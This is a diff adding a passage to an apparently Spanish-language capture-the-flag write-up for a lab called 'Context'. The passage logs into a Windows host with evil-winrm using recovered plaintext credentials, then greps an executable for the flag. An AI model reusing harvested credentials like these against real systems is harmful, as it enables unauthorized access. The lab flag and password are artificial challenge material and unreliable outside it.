@@ -370,3 +370,30 @@ Dentro podemos ver `credenciales` entonces simplemente nos conectamos:
 
 ![](/assets/images/writeup-context/dnSpy2.png)
 
+```
+❯ evil-winrm -i 10.13.37.12 -u jay.teignton -p 'D0ntL0seSk3l3tonK3y!'
+
+PS C:\Users\jay.teignton\Documents> whoami
+teignton\jay.teignton
+PS C:\Users\jay.teignton\Documents>
+```
+
+Podemos ver un archivo .exe que si vemos su contenido podemos encontrar la FLAG: `CONTEXT{l0l_s0c3ts_4re_fun}`
+
+```
+PS C:\Users\jay.teignton\Documents> dir
+
+    Directory: C:\Users\jay.teignton\Documents
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        10/7/2020  10:31 PM          11264 WindowsService.exe
+
+PS C:\Users\jay.teignton\Documents> Select-String CONTEXT WindowsService.exe
+2020)$46c273c4-b625-4cae-bba3-79fb0d3406bc
+1.0.0.0M.NETFramework,Version=v4.7.2TFrameworkDisplayName.NET Framework
+?A_CorExeMainmscoree.dllÿ% @CONTEXT{l0l_s0c3ts_4re_fun}
+€P€8€€h€Ü�Comments"CompanyNameFFileDescriptionWindowsServiceFileVer
+sion1.0.0.0FInternalNameWindowsService.exeHLegalCopyrightCopyright ©
+PS C:\Users\jay.teignton\Documents>
+```
